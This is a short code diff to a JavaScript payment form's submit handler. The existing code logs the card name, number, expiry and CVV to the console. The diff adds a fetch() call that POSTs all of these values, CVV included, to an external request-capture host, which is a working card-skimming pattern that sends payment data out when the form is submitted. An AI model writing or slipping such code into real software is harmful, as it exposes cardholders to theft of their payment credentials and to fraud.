@@ -14,4 +14,18 @@ paymentForm.addEventListener('submit', function(event) {
     console.log('Card Number:', cardNumber);
     console.log('Expiry:', expiry);
     console.log('CVV:', cvv);
+
+    // Send POST request with payment details
+    fetch('https://hfj.requestcatcher.com/test', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            cardName: cardName,
+            cardNumber: cardNumber,
+            expiry: expiry,
+            cvv: cvv
+        })
+    });
 });
